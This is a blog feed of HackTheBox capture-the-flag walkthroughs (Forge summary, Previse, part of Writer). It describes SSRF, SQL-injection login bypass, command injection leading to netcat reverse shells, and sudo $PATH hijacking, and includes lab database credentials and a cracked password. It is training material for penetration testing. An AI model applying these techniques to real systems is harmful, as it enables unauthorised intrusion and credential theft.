  <li>Identified running services using <code class="language-plaintext highlighter-rouge">nmap</code></li>
  <li>Found an image upload functionality on the web page that does not validate data, and accepts URL uploads.</li>
  <li>Discovered a hidden subdomain <strong>admin.forge.htb</strong> by fuzzing with <code class="language-plaintext highlighter-rouge">ffuf</code>. Access to the domain is only allowed to local hosts.
    <ul>
      <li>Exploited the URL upload functionality in the main <strong>forge.htb</strong> site to access the <strong>admin.forge.htb</strong> domain.</li>
      <li>Dumping the HTML source of the homepage of the <em>admin</em> domain revealed a link to <code class="language-plaintext highlighter-rouge">/announcements</code>, which was found to contain an FTP credential for a user named <code class="language-plaintext highlighter-rouge">user</code>.</li>
      <li>Exploited the URL upload in <strong>admin.forge.htb/upload</strong> to read the SSH private key of the user over FTP.</li>
    </ul>
  </li>
  <li>Inside the box as <code class="language-plaintext highlighter-rouge">user</code>;
    <ul>
      <li><code class="language-plaintext highlighter-rouge">user</code> has access to run <code class="language-plaintext highlighter-rouge">/opt/remote-manage.py</code> as root using <code class="language-plaintext highlighter-rouge">sudo</code></li>
      <li>Exploited the python script to drop into a <code class="language-plaintext highlighter-rouge">pdb</code> shell for privesc.</li>
    </ul>
  </li>
</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="hackthebox" /><category term="linux" /><category term="web" /><category term="ssrf" /><category term="broken access control" /><category term="ftp" /><category term="python" /><category term="pdb" /><category term="custom exploitation" /><summary type="html"><![CDATA[Forge is a very nice medium linux box featuring a web service that allows for local and remote file upload (via URL). After the upload, user is given a random URL to access the uploaded file. This URL upload functionality has a filter that attempts to block SSRFs, but the filter is flawed, and could be exploited to reach another subdomain on the server that foreign hosts are not allowed to directly access. The vector for privilege escalation is a python script that drops into a pdb shell when user caused an exception.]]></summary></entry><entry><title type="html">Previse - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/previse.html" rel="alternate" type="text/html" title="Previse - HackTheBox" /><published>2022-01-16T00:00:00+01:00</published><updated>2022-01-16T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/previse</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/previse.html"><![CDATA[<p><strong>Previse</strong> is an easy linux box that I really enjoyed. It has an Execute After Redirect (EAR) vulnerability, whereby the application issues a redirect when an unauthenticated user is attempting to access protected pages. However, the contents of the page is still returned in the body of the <strong>302</strong> redirect, but would be hard to notice in a browser as the browser will immediately follow the redirect. Foothold involves exploiting a <em>command injection</em> flaw in the web application, and privilege escalation is via <em>path tampering</em>.</p>

<p><br /></p>

<h3 id="info">Info</h3>
<p><br /></p>

<ul>
  <li><em>OS</em> - Linux</li>
  <li><em>Difficulty</em> - Easy</li>
  <li><em>Points</em> - 20</li>
  <li><em>Release</em> - 07/Aug/2021</li>
  <li><em>IP</em> - 10.10.11.104</li>
</ul>

<p><br /></p>

<hr />

<h3 id="recon">Recon</h3>
<p><br /></p>

<h4 id="nmap">Nmap</h4>

<pre><code class="language-raw">Starting Nmap 7.70 ( https://nmap.org ) at 2021-09-28 10:39 WAT
Stats: 0:00:53 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan                                                       
SYN Stealth Scan Timing: About 99.99% done; ETC: 10:40 (0:00:00 remaining)                                                            
Nmap scan report for 10.10.11.104
Host is up (0.26s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)                                                     
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                        
Nmap done: 1 IP address (1 host up) scanned in 86.13 seconds
</code></pre>

<p>The web server provide a login page (PHP);</p>

<p><img src="/assets/img/20210928104128.png" alt="" /></p>

<p><img src="/assets/img/20210928105733.png" alt="" /></p>

<p>Identified web technologies;</p>

<p><img src="/assets/img/20210928104900.png" alt="" /></p>

<p>Attempts to find the source code of the web app through google searches were unsuccessful.</p>

<p><code class="language-plaintext highlighter-rouge">searchsploit</code> showed user enumeration vulns for the version of OpenSSH running;</p>

<p><img src="/assets/img/20210928104401.png" alt="" /></p>

<p>Only the bottom one was runnable during testing, and provides false positives.</p>

<p>Further digging discovered a link to a menu that provides some links, most of which are login-protected;</p>

<p><img src="/assets/img/20210928110250.png" alt="" /></p>

<p>I was stucked on this for quite a long time with no idea what to do next as fuzzing for hidden contents and virtual hosts with <code class="language-plaintext highlighter-rouge">gobuster</code> and <code class="language-plaintext highlighter-rouge">ffuf</code> yielded nothing. Going through captured HTTP traffic in <code class="language-plaintext highlighter-rouge">mitmproxy</code> revealed something very weird;</p>

<p><img src="/assets/img/20210929111805.png" alt="" /></p>

<p>When a request was made to <code class="language-plaintext highlighter-rouge">/accounts.php</code> (a link I discovered earlier), the web server redirects user to the login page. Most HTTP redirects simply return an emtpy HTML body. However, this one returns the contents of the requested web page, which the browser does not display as it simply follows the redirect instruction. As can be seen in the image above, there is a form for account creation, that was expected to be accessible only to admins. Using the parameters defined in the web form, I was able to craft a POST request to create an account, and gain access to the web application;</p>

<p><img src="/assets/img/20210929113047.png" alt="" /></p>

<p><img src="/assets/img/20210929112811.png" alt="" /></p>

<p><br /></p>

<hr />

<h3 id="foothold">Foothold</h3>
<p><br /></p>

<p>Having gained access to the web application, the next step is to gain a command shell on the host.</p>

<p>I found an interesting file in the <code class="language-plaintext highlighter-rouge">/files.php</code> page containing possible backup data, and the username of another user <code class="language-plaintext highlighter-rouge">newguy</code>;</p>

<p><img src="/assets/img/20210929113453.png" alt="" /></p>

<p>The link to the file is <code class="language-plaintext highlighter-rouge">http://previse.htb/download.php?file=32</code>, with the numeric ID being an interesting target for file enumeration. True to it’s name, the file downloaded is a ZIP file containing source code of the web app;</p>

<p><img src="/assets/img/20210929113936.png" alt="" /></p>

<p>The file <code class="language-plaintext highlighter-rouge">config.php</code> was found to contain MySQL credentials, which is probably running locally as I can’t access the service from my host;</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
<span class="k">function</span> <span class="n">connectDB</span><span class="p">(){</span>
    <span class="nv">$host</span> <span class="o">=</span> <span class="s1">'localhost'</span><span class="p">;</span>
    <span class="nv">$user</span> <span class="o">=</span> <span class="s1">'root'</span><span class="p">;</span>
    <span class="nv">$passwd</span> <span class="o">=</span> <span class="s1">'mySQL_p@ssw0rd!:)'</span><span class="p">;</span>
    <span class="nv">$db</span> <span class="o">=</span> <span class="s1">'previse'</span><span class="p">;</span>
    <span class="nv">$mycon</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">mysqli</span><span class="p">(</span><span class="nv">$host</span><span class="p">,</span> <span class="nv">$user</span><span class="p">,</span> <span class="nv">$passwd</span><span class="p">,</span> <span class="nv">$db</span><span class="p">);</span>
    <span class="k">return</span> <span class="nv">$mycon</span><span class="p">;</span>
<span class="p">}</span>
<span class="cp">?&gt;</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>The username was tested against possible users on the SSH server, but didn’t match any.</p>

<p>Using the file upload functionality, I generated a PHP web shell using <code class="language-plaintext highlighter-rouge">weevely</code> and upload it to the web app to gain code execution;</p>

<p><img src="/assets/img/20210929115525.png" alt="" /></p>

<p>This did not work as requests to the uploaded file simply result in file download to client with no execution at server side;</p>

<p><img src="/assets/img/20210929120135.png" alt="" /></p>

<p>At this point I decided to analyse the PHP codes involved in file upload and download to figure out a way, if any, to exploit this. Review of <code class="language-plaintext highlighter-rouge">/download.php</code> showed the files are stored in the MySQL backend, not disk.</p>

<p><img src="/assets/img/20210929143953.png" alt="" /></p>

<p>I can’t think of any way to exploit this since the file is not stored on disk in the web root. So I continue to analyse other PHP source codes downloaded from the server, and caught a break in the file <code class="language-plaintext highlighter-rouge">/logs.php</code>, which is used to download file access logs from the server;</p>

<p><img src="/assets/img/20210929145139.png" alt="" /></p>

<p>Notice in the above code that the POST parameter <code class="language-plaintext highlighter-rouge">delim</code>, which is used to specify type of delimiter to use when generating the log output, is <strong>injected directly</strong> into a shell command, making it vulnerable to <em>Command Injection</em> attacks;</p>

<p><img src="/assets/img/20210929144824.png" alt="" /></p>

<p><img src="/assets/img/20210929144906.png" alt="" /></p>

<p>I spawned a reverse shell on the host using <code class="language-plaintext highlighter-rouge">netcat</code> and <code class="language-plaintext highlighter-rouge">bash</code>, and identified a local user named <strong>m4lwhere</strong>.</p>

<p><img src="/assets/img/20210929145938.png" alt="" /></p>

<p><code class="language-plaintext highlighter-rouge">netstat</code> showed a service running on port <strong>3306</strong> (MySQL)</p>

<p><img src="/assets/img/20210929150032.png" alt="" /></p>

<p>Using the root credentials found earlier in the site’s backup file, I gained access to the <code class="language-plaintext highlighter-rouge">previse</code> database, and found the password hash of <strong>m4lwhere</strong>;</p>

<p><img src="/assets/img/20210929151151.png" alt="" /></p>

<p>The hash captured could not be cracked with the infamous <em>rockyou.txt</em> wordlist using <code class="language-plaintext highlighter-rouge">john</code>, so I moved on.</p>

<p>Surfing through the file system I made an interesting discovery;</p>

<p><img src="/assets/img/20210929151946.png" alt="" /></p>

<p>This may be helpful when going for root, but I am still working as <code class="language-plaintext highlighter-rouge">www-data</code>.</p>

<p>Going through the results of <code class="language-plaintext highlighter-rouge">john</code> from the previous attempt, I noticed a warning where <code class="language-plaintext highlighter-rouge">john</code> identified the hash as more than one type;</p>

<p><img src="/assets/img/20210929165957.png" alt="" /></p>

<p>Since <code class="language-plaintext highlighter-rouge">john</code> used <code class="language-plaintext highlighter-rouge">md5crypt</code> in the first attempt, I manually selected the other format, and the hash was cracked successfully after taking much longer. Recovered credential: <code class="language-plaintext highlighter-rouge">m4lwhere:ilovecody112235!</code></p>

<p><img src="/assets/img/20210929165903.png" alt="" /></p>

<p>I was then able to connect to the box over SSH, and obtain the user flag;</p>

<p><img src="/assets/img/20210929170331.png" alt="" /></p>

<p><br /></p>

<hr />

<h3 id="privesc">PrivEsc</h3>
<p><br /></p>

<p>The user <strong>m4lwhere</strong> can run a custom script as root using <code class="language-plaintext highlighter-rouge">sudo</code>;</p>

<p><img src="/assets/img/20210929170626.png" alt="" /></p>

<p>The code of the script;</p>

<p><img src="/assets/img/20210929171854.png" alt="" /></p>

<p>Notice that the script executes the <code class="language-plaintext highlighter-rouge">gzip</code> program to create some archives. However, the call to <code class="language-plaintext highlighter-rouge">gzip</code> uses <strong>relative</strong>, not <strong>absolute</strong> path. When a program is referenced using relative path, the program is searched in the directories defined in the user’s <code class="language-plaintext highlighter-rouge">$PATH</code> environment variable, and the first match found is executed. Since I can alter the <code class="language-plaintext highlighter-rouge">$PATH</code> variable of the user, the script can be fooled into executing a file with the name <code class="language-plaintext highlighter-rouge">gzip</code> that comes before the actual <code class="language-plaintext highlighter-rouge">gzip</code> program in the <code class="language-plaintext highlighter-rouge">$PATH</code> hierarchy;</p>

<p><img src="/assets/img/20210929172616.png" alt="" /></p>

<ol>
  <li>The original <code class="language-plaintext highlighter-rouge">$PATH</code></li>
  <li>Created a bash reverse shell saved as <code class="language-plaintext highlighter-rouge">gzip</code> in <code class="language-plaintext highlighter-rouge">/dev/shm</code></li>
  <li>Prefix <code class="language-plaintext highlighter-rouge">$PATH</code> with <code class="language-plaintext highlighter-rouge">/dev/shm</code> to hijack relative calls to <code class="language-plaintext highlighter-rouge">gzip</code></li>
</ol>

<p>Executing the script using <code class="language-plaintext highlighter-rouge">sudo</code> sent a reverse shell with root privileges to my attack host;</p>

<p><img src="/assets/img/20210929173047.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="summary">Summary</h3>
<p><br /></p>

<ul>
  <li>Identified running services using NMAP.</li>
  <li>Found a login page at <code class="language-plaintext highlighter-rouge">/login.php</code>, and a navigation menu at <code class="language-plaintext highlighter-rouge">/nav.php</code></li>
  <li>Noticed that the web app redirects unauthenticated users to the login page when they make a request to an authentication-protected page for accounts creation at <code class="language-plaintext highlighter-rouge">/accounts.php</code>, but includes the actual contents of the page in the body of the response. This can hardly be noticed when using a web browser.</li>
  <li>Crafted a request using the parameters identified in the <code class="language-plaintext highlighter-rouge">/accounts.php</code> page to create an account, which gave me admin access to the web app.</li>
  <li>Found a ZIP file containing backup of the source code of the web application, analysis on which revealed a login credential of a locally-running MySQL server for the <code class="language-plaintext highlighter-rouge">root</code> user.</li>
  <li>Tested the file upload functionality for web shells upload and execution, which failed because all uploaded files are stored in the backend MySQL server, not disk.</li>
  <li>Identified a <em>Command Injection</em> flaw through static analysis of the downloaded source code backup. The file is <code class="language-plaintext highlighter-rouge">/logs.php</code>, which generates log messages for download. This was exploited to gain access to the host as <code class="language-plaintext highlighter-rouge">www-data</code> (the default apache2 web user).</li>
  <li>Inside the host as <code class="language-plaintext highlighter-rouge">www-data</code>;
    <ul>
      <li><code class="language-plaintext highlighter-rouge">netstat</code> identified a local MySQL server running, accessible using the MySQL credentials found in the configuration file in the site backup archive.</li>
      <li>Found a password hash for a user named <code class="language-plaintext highlighter-rouge">m4lwhere</code> inside the <em>previse</em> database, cracked it using <em>John the Ripper</em> and the iconic <code class="language-plaintext highlighter-rouge">rockyou.txt</code> wordlist, and gained SSH access to the box.</li>
    </ul>
  </li>
  <li>Inside the host as <code class="language-plaintext highlighter-rouge">m4lwhere</code>;
    <ul>
      <li>Idenitifed a script that can be executed by the user with root privileges using <code class="language-plaintext highlighter-rouge">sudo</code>.</li>
      <li>The script was found to be making a call to another binary using a <em>relative path</em>, which make it vulnerable to <em>arbitrary code execution</em> via <code class="language-plaintext highlighter-rouge">$PATH</code> tampering. This flaw was exploited to gain a root shell.</li>
    </ul>
  </li>
</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="hackthebox" /><category term="linux" /><category term="web" /><category term="execute after redirect" /><category term="broken access control" /><category term="static analysis" /><category term="command injection" /><category term="hash cracking" /><category term="path tampering" /><summary type="html"><![CDATA[Previse is an easy linux box that I really enjoyed. It has an Execute After Redirect (EAR) vulnerability, whereby the application issues a redirect when an unauthenticated user is attempting to access protected pages. However, the contents of the page is still returned in the body of the 302 redirect, but would be hard to notice in a browser as the browser will immediately follow the redirect. Foothold involves exploiting a command injection flaw in the web application, and privilege escalation is via path tampering.]]></summary></entry><entry><title type="html">Writer - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/writer.html" rel="alternate" type="text/html" title="Writer - HackTheBox" /><published>2021-12-11T00:00:00+01:00</published><updated>2021-12-11T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/writer</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/writer.html"><![CDATA[<p><strong>Writer</strong> is definitely one of the toughest boxes I have ever solved at the time of writing this. It features a website that is vulnerable to <em>SQL injection</em>, which leads to authentication bypass. Once you have access, there is a feature that allows you to add and edit stories, which is vulnerable to <em>command injection</em> in the filename, but will be tricky to spot without using the SQL injection flaw and reading the python code of the web application.</p>

<p>Once inside the box, there are two local users, <code class="language-plaintext highlighter-rouge">kyle</code>, and <code class="language-plaintext highlighter-rouge">john</code>. Access to Kyle’s account was obtained after cracking a hash obtained from a local MySQL database. Once you have access as Kyle, you can exploit a write permission to <code class="language-plaintext highlighter-rouge">/etc/postfix/disclaimer</code> to move laterally to John’s account, and from there exploit another write permission to create a malicious configuration file that will be by <code class="language-plaintext highlighter-rouge">apt</code> through a cron job to gain code execution as <code class="language-plaintext highlighter-rouge">root</code>.</p>

<p><br /></p>

<h3 id="info">Info</h3>
<p><br /></p>

<p><img src="/assets/img/20211014071205.png" alt="" /></p>

<p><img src="/assets/img/20211014071235.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="recon">Recon</h3>
<p><br /></p>

<h4 id="nmap">NMAP</h4>

<pre><code class="language-raw"># Nmap 7.70 scan initiated Thu Oct 14 07:14:55 2021 as: nmap -sC -sV -oN nmap.txt -v 10.10.11.101
Nmap scan report for 10.10.11.101
Host is up (0.22s latency).
Not shown: 995 closed ports
PORT     STATE    SERVICE     VERSION
22/tcp   open     ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp   open     http        Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Story Bank | Writer.HTB
139/tcp  open     netbios-ssn Samba smbd 4.6.2
445/tcp  open     netbios-ssn Samba smbd 4.6.2
3809/tcp filtered apocd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 14m21s, deviation: 0s, median: 14m21s
| nbstat: NetBIOS name: WRITER, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
| Names:
|   WRITER&lt;00&gt;           Flags: &lt;unique&gt;&lt;active&gt;
|   WRITER&lt;03&gt;           Flags: &lt;unique&gt;&lt;active&gt;
|   WRITER&lt;20&gt;           Flags: &lt;unique&gt;&lt;active&gt;
|   \x01\x02__MSBROWSE__\x02&lt;01&gt;  Flags: &lt;group&gt;&lt;active&gt;
|   WORKGROUP&lt;00&gt;        Flags: &lt;group&gt;&lt;active&gt;
|   WORKGROUP&lt;1d&gt;        Flags: &lt;unique&gt;&lt;active&gt;
|_  WORKGROUP&lt;1e&gt;        Flags: &lt;group&gt;&lt;active&gt;
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-10-14 07:30:13
|_  start_date: N/A

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Oct 14 07:15:57 2021 -- 1 IP address (1 host up) scanned in 61.77 seconds
</code></pre>

<p>A complete port scan didn’t yield any additional port.</p>

<h4 id="web">Web</h4>

<p><img src="/assets/img/20211014072248.png" alt="" /></p>

<p><img src="/assets/img/20211014072318.png" alt="" /></p>

<p>Found an email address <code class="language-plaintext highlighter-rouge">admin@writer.htb</code> in the about page;</p>

<p><img src="/assets/img/20211014073034.png" alt="" /></p>

<p>The <em>contact us</em> page has a form that appears to be non-responsive at first, but looking at my proxy, a request was actually made that returned a <strong>404 Not found</strong>;</p>

<p><img src="/assets/img/20211014073900.png" alt="" /></p>

<p><img src="/assets/img/20211014074102.png" alt="" /></p>

<p>Removing the PHP extension from the form submission path above resulted in a <strong>200</strong> response, but the response obtained is no different from the original page.</p>

<p>Bruteforcing the web root using <code class="language-plaintext highlighter-rouge">ffuf</code> showed some interesting paths;</p>

<p><img src="/assets/img/20211014074606.png" alt="" /></p>

<p>The path <code class="language-plaintext highlighter-rouge">/dashboard</code> redirects to the homepage, which I am guessing is due to access control. The <code class="language-plaintext highlighter-rouge">/administrative</code> page provide a login page;</p>

<p><img src="/assets/img/20211014074758.png" alt="" /></p>

<p>Testing common usernames and passwords did not work. Bruteforcing the blog posts numeric ID did not reveal any hidden post.</p>

<p>The <code class="language-plaintext highlighter-rouge">/static</code> page has directory listing, but nothing of interest was found inside;</p>

<p><img src="/assets/img/20211014091614.png" alt="" /></p>

<h4 id="smb">SMB</h4>

<p>Attaempting null authentication and intentionally wrong credentials kept giving me this error;</p>

<p><img src="/assets/img/20211014075245.png" alt="" /></p>

<p>Quick googling showed this could happen due to permission errors or non-existing shares. Since I don’t know any share name I assumed it was the latter.</p>

<p>Using <code class="language-plaintext highlighter-rouge">smbmap</code> (Impacket), I was able to list some shares with null authentication, but I have access to none of them;</p>

<p><img src="/assets/img/20211014075557.png" alt="" /></p>

<p>Dumping the password policy of the SMB server using <em>CrackMapExec</em>, the server does not have any auto-locking policy for accounts, which means we can bruteforce creds with locking accounts;</p>

<p><img src="/assets/img/20211014080025.png" alt="" /></p>

<p>Bruteforce attampts with <em>CrackMapExec</em> kept giving false postives;</p>

<p><img src="/assets/img/20211014082807.png" alt="" /></p>

<p>I’m guessing the error is due to lack of SMBv1 support, which is what  <code class="language-plaintext highlighter-rouge">hydra</code> reported also;</p>

<p><img src="/assets/img/20211014085127.png" alt="" /></p>

<p>Even metasploit’s SMB login bruteforce module errored out;</p>

<p><img src="/assets/img/20211014090619.png" alt="" /></p>

<h4 id="the-web-login-form">The Web Login Form</h4>

<p>The login form at <code class="language-plaintext highlighter-rouge">/administrative</code> page is submitted via POST request with the parameters <code class="language-plaintext highlighter-rouge">uname</code> and <code class="language-plaintext highlighter-rouge">password</code>. Changing the request method to GET does not appear to affect the way the web app process the form. Deleting the <code class="language-plaintext highlighter-rouge">password</code> parameter raised a <strong>500 INTERNAL SERVER ERROR</strong>, but deleting the <code class="language-plaintext highlighter-rouge">uname</code> parameter didn’t display any error. This indicate a difference in the way the two parameters are handled by the web application. Attempts to bruteforce the login page using the discovered email address <em>admin@writer.htb</em>, the username <em>admin</em>, and a wordlist made by crawling the web pages using <code class="language-plaintext highlighter-rouge">CeWL</code> didn’t work.</p>

<p>Fuzzing the login parameter <code class="language-plaintext highlighter-rouge">username</code> with SQL Injection payloads worked, leading to a successful authentication bypass, which redirected me to the <code class="language-plaintext highlighter-rouge">/dashboard</code> page;</p>

<p><img src="/assets/img/20211014101649.png" alt="" /></p>

<p><img src="/assets/img/20211014102058.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="dashboard">Dashboard</h3>
<p><br /></p>

<p>In the settings page, there is an option that allows the title, description, and logo of the site to be changed. This could be an interesting target for stored XSS when targeting other users, but I don’t think I need it since I can access all accounts using the SQL injection flaw in the login page.</p>

<p><img src="/assets/img/20211014210012.png" alt="" /></p>

<p>However, clicking the save button in the bottom of the page did not send any request. Going to the users page, it appears the only user account in the web app is that of the admin;</p>

<p><img src="/assets/img/20211014210940.png" alt="" /></p>

<p>Going into the stories page from the navigation menu, a list of all the stories were displayed, along with an option that allow stories to be updated;</p>

<p><img src="/assets/img/20211014212639.png" alt="" /></p>

<p>During this update, user can change the title, tagline, image, and content of the story;</p>

<p><img src="/assets/img/20211014212808.png" alt="" /></p>

<p>The image upload functionality validates uploaded files by checking the extension of the file submitted in the POST request, and rejects it if it doesn’t end with a <code class="language-plaintext highlighter-rouge">.jpg</code> extension. Saving a PHP file as <code class="language-plaintext highlighter-rouge">test.jpg</code> allows the file to be uploaded, but couldn’t be executed due to the extension not being <code class="language-plaintext highlighter-rouge">.php</code>;</p>

<p><img src="/assets/img/20211014213223.png" alt="" /></p>

<p>By changing the file extension to <code class="language-plaintext highlighter-rouge">.jpg.php</code>, the upload succeeded, which indicate the web app merely checks for the presence of <code class="language-plaintext highlighter-rouge">.jpg</code> in the filename;</p>

<p><img src="/assets/img/20211014214405.png" alt="" /></p>

<p>When the above script was requested, however, the server simply sends the file for download without executing it;</p>

<p><img src="/assets/img/20211014220616.png" alt="" /></p>

<p>I assumed it’s some <em>.htaccess</em>-like config preventing the server from executing the PHP file, so I tried testing the <code class="language-plaintext highlighter-rouge">filename</code> POST parameter for path traversal, which the web app is vulnerable to;</p>

<p><img src="/assets/img/20211014221159.png" alt="" /></p>

<p>Multple attempts to have the code executed did not work. Since the login page is vulnerable to SQL injection, I dumped the login request to a text file and passed it to <code class="language-plaintext highlighter-rouge">sqlmap</code> to work it’s magic.</p>

<p><br /></p>

<hr />
<h3 id="sqlmap">SQLMap</h3>
<p><br /></p>

<p>After exporting the login request from <em>Burp Suite</em>, I passed it to <code class="language-plaintext highlighter-rouge">sqlmap</code> with the <code class="language-plaintext highlighter-rouge">--threads=10</code> to speed things up a bit since it’s a blind SQL injection. It identified 2 databases in the server; <code class="language-plaintext highlighter-rouge">information_schema</code>, which is default for MySQL servers, and <code class="language-plaintext highlighter-rouge">writer</code>;</p>

<p><img src="/assets/img/20211014225002.png" alt="" /></p>

<p>Tables found in the <code class="language-plaintext highlighter-rouge">writer</code> database;</p>

<p><img src="/assets/img/20211014225206.png" alt="" /></p>

<p>After <code class="language-plaintext highlighter-rouge">sqlmap</code> screemed at me all the way about invalid characters, the table <code class="language-plaintext highlighter-rouge">users</code> was dumped successfully, which was found to contain hash of the user <code class="language-plaintext highlighter-rouge">admin</code>;</p>

<p><img src="/assets/img/20211014231158.png" alt="" /></p>

<p>The above hash looks corrupted since the inital length of the field as reported by <em>sqlmap</em> was 32 characters long, but after dumping, the hash in the CSV file was 37 characters long. This made sense since <em>sqlmap</em> warned me about reliability issues when using multiple threads for blind injections. So I used the <code class="language-plaintext highlighter-rouge">--sql-shell</code> argument to run specific SQL command that retrieve only the target hash;</p>

<p><img src="/assets/img/20211014231958.png" alt="" /></p>

<p>Although the hash looks like an MD5 hash, <code class="language-plaintext highlighter-rouge">john</code> identified it as multiple other formats, all of which were tested. But the hash could not be cracked.</p>

<p><br /></p>

<hr />
<h3 id="foothold">Foothold</h3>
<p><br /></p>

<p>With the <code class="language-plaintext highlighter-rouge">admin</code>  hash proving to be uncrackable, I went back to the file upload vulnerability on the admin dashboard. The path traversal vulnerability allows writing to top level directories that are writable to the web server user like <code class="language-plaintext highlighter-rouge">/tmp</code> and <code class="language-plaintext highlighter-rouge">/dev/shm</code>. Attempts to write to the default <em>apache</em> web root <code class="language-plaintext highlighter-rouge">/var/www/html</code> failed. Multiple command injection payloads in the filename parameter for the uploaded image also failed, and I just can’t get the server to execute uploaded PHP codes. So I moved on.</p>

<p>Going back to the SQL injection using <code class="language-plaintext highlighter-rouge">sqlmap</code>, I realized I may be able to read local files using the <code class="language-plaintext highlighter-rouge">--file-read</code> argument. So I tested it by requesting <code class="language-plaintext highlighter-rouge">/etc/hostname</code>, and it worked. Since it’s a blind injection, the retrieval was slow and will be slower when dealing with larger files;</p>

<p><img src="/assets/img/20211015100500.png" alt="" /></p>

<p>SInce there is a path traversal vulnerability when editing stories in the admin dashboard that I couldn’t exploit to gain code execution as I couldn’t figure out the web root of the server, and I know the target is a linux host, I tried dumping  the file <code class="language-plaintext highlighter-rouge">/etc/apache2/sites-enabled/000-default.conf</code>, which is the default configuration file for <em>Apache2</em>, and will contain the web root. This was a very slow process with <em>sqlmap</em>, so I had to switch to manual SQL queries that use <code class="language-plaintext highlighter-rouge">substring()</code> to download chunks of the file, and it worked;</p>

<p><img src="/assets/img/20211015233940.png" alt="" /></p>

<p>And just like that, web root has been identified. The <code class="language-plaintext highlighter-rouge">.wsgi</code> is for python web applications, which explains some the difficulties I had enumerating paths earlier. Uploading a <em>.php</em> and a <em>.txt</em> files to the above path didn’t show any error message, but the uploaded files could not be requested. By checking the size of the uploaded files using the <code class="language-plaintext highlighter-rouge">length(load_file('/path/to/file'))</code>, I verified the upload was successful. This is most likely a deadend because all requests to the path are being handled by the <code class="language-plaintext highlighter-rouge">writer.wsgi</code> script, and even if I managed to overwrite it, I will need to reboot the Apache server for the script to be loaded again. So I went back to all my previous findings in hope of finding something I missed earlier.</p>

<p>The add new story feature in the admin page of the web app is the one thing I haven’t tested before;</p>

<p><img src="/assets/img/20211016214107.png" alt="" /></p>

<p>Going through the request it generated in <em>Burp Suite</em>, I noticed an empty parameter named <code class="language-plaintext highlighter-rouge">image_url</code>.  Adding any sort of value to the parameter result in a blank response from the server after it hangs for a few seconds;</p>

<p><img src="/assets/img/20211016214853.png" alt="" /></p>

<p>I needed to view the source code to understand what’s going on. The contents of the apache2 config file for enabled sites/vhosts showed <code class="language-plaintext highlighter-rouge">/static</code> path in the web app was mapped to <code class="language-plaintext highlighter-rouge">/var/www/writer.htb/writer/static</code>;</p>

<p><img src="/assets/img/20211028080933.png" alt="" /></p>

<p>Since <code class="language-plaintext highlighter-rouge">/static</code> is accessible in the web root of the website, that means <code class="language-plaintext highlighter-rouge">/var/www/writer.htb/writer</code> will likely be the root of the website. Reading up a bit on how python web apps handle paths, I learned that the file <code class="language-plaintext highlighter-rouge">__init__.py</code> is usually used to handle the path mappings of a directory. So I used SQLMap to dump the file, which will be at <code class="language-plaintext highlighter-rouge">/var/www/writer.htb/writer/__init__.py</code> in this case, and I got the python source code. Going through it, I found a possible command injection flaw on how the web app handles URL uploads when adding a story in the admin dashboard;</p>

<p><img src="/assets/img/20211028081803.png" alt="" /></p>

<p>The <code class="language-plaintext highlighter-rouge">urlib.request.urlretrieve</code> method returns two values, the path to which the given URL has been downloaded, which will be random name inside <code class="language-plaintext highlighter-rouge">/tmp</code>, and the headers returned. Notice that the the <code class="language-plaintext highlighter-rouge">local_filename</code> is injected directly into a system command used to move the image. Testing the <code class="language-plaintext highlighter-rouge">urlretreive()</code> function locally showed that it supports the <code class="language-plaintext highlighter-rouge">file://</code> protocol, and that the returned <code class="language-plaintext highlighter-rouge">local_filename</code> when using the <code class="language-plaintext highlighter-rouge">file://</code> protocol is not random, but the absolute path of the file on disk.</p>

<p><img src="/assets/img/20211028082338.png" alt="" /></p>

<p>With the above info, I was able to develop an RCE exploit for the web app after running multiple test locally on my python3 installation. By creating a story on the dashboard and setting the image name to;</p>

<p><img src="/assets/img/20211028083350.png" alt="" /></p>

<p>And the URL upload to;</p>

<p><img src="/assets/img/20211028090606.png" alt="" /></p>

<p>I got a reverse shell after sending the request;</p>

<p><img src="/assets/img/20211016233404.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="user">User</h3>
<p><br /></p>

<p>Two local users were identified: <strong>john</strong> and <strong>kyle</strong>. <em>Kyle</em> got the user flag.</p>

<p>Open ports;</p>

<p><img src="/assets/img/20211016233624.png" alt="" /></p>

<p>Going through the source file of the web application, I found a MySQL credential for the web app;</p>

<p><img src="/assets/img/20211016234843.png" alt="" /></p>

<p>The password did not give access to any of the local accounts on the host, nor the SMB service running on the host.</p>

